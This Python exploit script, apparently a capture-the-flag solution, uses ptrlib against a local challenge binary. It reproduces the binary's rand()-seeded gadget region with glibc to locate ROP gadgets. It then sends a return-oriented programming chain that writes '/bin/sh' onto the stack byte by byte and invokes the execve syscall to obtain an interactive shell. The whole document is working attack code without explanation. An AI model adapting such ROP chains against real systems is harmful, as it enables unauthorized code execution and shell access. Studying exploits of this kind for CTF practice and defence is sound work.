from ptrlib import *
import ctypes

glibc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc-2.27.so')

seed = 10248

sock = Process("./chall")
sock.sendlineafter("seed: ", str(seed))
sock.recvuntil("addr: ")
rop_base = int(sock.recvline(), 16)
logger.info("rop base = " + hex(rop_base))

glibc.srand(seed)
gadgets = b''
for j in range(0x2000):
    gadgets += p32(glibc.rand())
rop_pop_rax = rop_base + gadgets.index(b'\x58\xc3')
rop_pop_rdi = rop_base + gadgets.index(b'\x5f\xc3')
rop_ret = rop_base + gadgets.index(b'\xc3')
rop_mov_rax_rsp = rop_base + gadgets.index(b'\x54\x58\xc3')
rop_syscall = rop_base + gadgets.index(b'\x0f\x05')
rop_pop_rbx = rop_base + 0x000000000000235d
rop_sub_eax_edi_add_al_1e = 0x00000000000053bc
rop_xor_rax_83d21fb_bl = 0x0000000000000e0b

logger.info("break at *" + hex(0))

def mov_rax_rsp():
    payload  = p64(rop_mov_rax_rsp)
    return payload

def write_to_stack(val):
    payload  = p64(rop_pop_rbx)
    payload += p64(val)
    payload += p64(rop_xor_rax_83d21fb_bl)
    return payload

def sub_rax(delta):
    payload  = p64(rop_pop_rdi)
    payload += p64(0x1e + delta)
    payload += p64(rop_sub_eax_edi_add_al_1e)
    return payload

def inc_rax():
    payload  = p64(rop_pop_rdi)
    payload += p64(0x1d)
    payload += p64(rop_sub_eax_edi_add_al_1e)
    return payload

payload = b''
payload += mov_rax_rsp()
payload += sub_rax(0x83d21fb - 0xf00)
for c in b'/bin/sh\x00':
    payload += write_to_stack(c)
    payload += inc_rax()
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
payload += p64(0xffffffffffffffff)
_ = input()
sock.sendafter("rrop: ", payload)

sock.interactive()
